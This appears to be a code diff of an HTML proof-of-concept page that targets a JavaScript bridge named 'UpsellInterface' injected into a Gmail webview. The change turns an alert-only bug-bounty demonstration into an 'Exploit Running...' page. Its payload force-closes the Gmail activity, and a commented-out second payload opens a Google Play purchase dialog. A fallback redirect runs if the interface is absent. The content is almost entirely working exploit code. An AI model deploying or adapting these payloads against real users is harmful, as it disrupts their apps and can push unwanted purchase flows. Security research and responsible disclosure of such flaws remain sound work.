@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head><title>Gmail JS Interface Exploit</title></head>
 <body>
-    <h1>Bug Bounty PoC</h1>
+    <h1>Exploit Running...</h1>
     <script>
-        try {
-            // Prove we can execute methods on the injected interface
-            window.UpsellInterface.showBuyFlowWithPurchaseParams("hacked", "hacked", "hacked");
-            // Alternatively, force the activity to close to prove execution
-            // window.UpsellInterface.finish();
-            alert("Exploit Successful! UpsellInterface accessed.");
-        } catch(e) {
-            document.write("Error: " + e.message);
+        // Check if the vulnerable Google Interface is injected
+        if (typeof window.UpsellInterface !== 'undefined') {
+            
+            // PAYLOAD 1: Force the Gmail Activity to close immediately
+            window.UpsellInterface.finish();
+            
+            // PAYLOAD 2: (Optional) Try to pop up a Google Play purchase dialog
+            // window.UpsellInterface.showBuyFlowWithPurchaseParams(new Uint8Array([0]), "success", "fail");
+            
+        } else {
+            // Fallback to try and redirect if the interface isn't there
+            window.location.href = "https://example.com/failed";
         }
     </script>
 </body>
